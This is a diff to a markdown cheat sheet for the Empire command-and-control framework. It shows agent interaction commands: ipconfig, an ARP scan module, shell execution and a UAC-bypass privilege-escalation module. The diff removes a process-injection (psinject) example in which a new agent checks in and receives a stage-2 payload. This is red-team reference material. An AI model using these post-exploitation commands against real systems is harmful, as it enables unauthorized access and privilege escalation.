@@ -109,31 +109,21 @@ Search Tag(s): #empire #command-and-control #interactive-shell #help-menu
 │                │ shell/privesc/bypassuac_eventvwr.   │                               │
 └────────────────┴─────────────────────────────────────┴───────────────────────────────┘
 
-(Empire: WindowsWS01) >
+(Empire: AGENT_NAME) >
 ```
 
 ## 02 - Usage
 
-`(Empire: AGENT_NAME) > ipconfig`
+```
+(Empire: AGENT_NAME) > ipconfig
 
-`(Empire: AGENT_NAME) > powershell_situational_awareness_network_arpscan`
+(Empire: AGENT_NAME) > powershell_situational_awareness_network_arpscan
+```
 
 ### Execute Shell Commands
 
-`(Empire: AGENT_NAME) > shell <commands>`
-
-### 2.1 - Process Manipulation
-
-- Syntax
-
-`(Empire: AGENT_NAME) > psinject <listener> <pid>`
-
 ```
-(Empire: AGENT_NAME) > psinject http 460
-[*] Tasked admin to run Task 3
-[+] New agent F38APL75 checked in
-[*] Sending agent (stage 2) to F38APL75 at 10.0.2.4
-(Empire: AGENT_NAME) > interact F38APL75
+(Empire: AGENT_NAME) > shell <commands>
 ```
 
 ---
